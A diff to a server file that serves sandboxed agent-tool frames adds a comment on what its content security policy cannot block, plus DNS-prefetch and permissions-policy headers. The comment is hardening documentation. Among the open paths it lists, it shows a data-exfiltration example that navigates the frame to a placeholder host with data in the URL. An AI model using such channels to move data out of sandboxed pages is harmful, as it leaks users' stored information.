@@ -7,6 +7,15 @@
 // of a page it attends — so what it stores must not be able to leave it: scripts and styles come from the visuals' CDNs and
 // from its own files, and the only place it can connect to is itself. Framed only by the workspace, or on the phone's own
 // label only by the phone app. It never runs on openlen.com.
+//
+// What the policy does NOT close, said plainly: a content policy governs fetch, XHR, forms, frames and where scripts,
+// styles, fonts and images load from — not every way a page can reach the network. Left open by the browser itself:
+//   · the frame navigating itself (`location.href = "https://elsewhere/?" + data`) — a sandbox without
+//     `allow-top-navigation` keeps the parent page, not the frame's own document;
+//   · WebRTC's ICE/STUN lookups, which no CSP directive governs;
+//   · the URLs it asks the allowed CDNs (and fonts.googleapis.com) for — a path or query there is a request to them.
+// DNS prefetching is switched off below (`x-dns-prefetch-control`), and so are camera, microphone, geolocation and
+// payment (`permissions-policy`, matched by the frame's own `allow` list).
 import "server-only";
 
 import { agentToolsEnabled } from "@/lib/agent-tools/enabled";
@@ -72,6 +81,8 @@ export async function serveAgentTool(
     "cache-control": "no-store",
     "x-content-type-options": "nosniff",
     "referrer-policy": "no-referrer",
+    "x-dns-prefetch-control": "off",
+    "permissions-policy": "camera=(), microphone=(), geolocation=(), payment=()",
   };
 
   if (path === TOOL_BRIDGE_PATH) {
